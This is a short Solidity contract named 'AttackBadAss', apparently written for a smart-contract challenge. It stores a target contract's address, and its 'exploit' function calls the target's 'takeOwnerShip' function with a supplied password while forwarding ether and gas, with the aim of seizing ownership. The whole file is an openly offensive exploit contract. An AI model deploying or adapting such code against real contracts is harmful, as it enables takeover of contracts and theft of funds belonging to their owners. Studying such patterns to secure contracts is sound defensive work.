contract AttackBadAss {
    
    address payable originalContract;
    
    constructor(address payable _originalContract) public payable {
        originalContract = _originalContract;
    }
    
    function exploit(string memory _password) public payable {
        bytes memory payload = abi.encodeWithSignature("takeOwnerShip(string)", _password);
        originalContract.call.value(msg.value).gas(100000)(payload);
    }
}
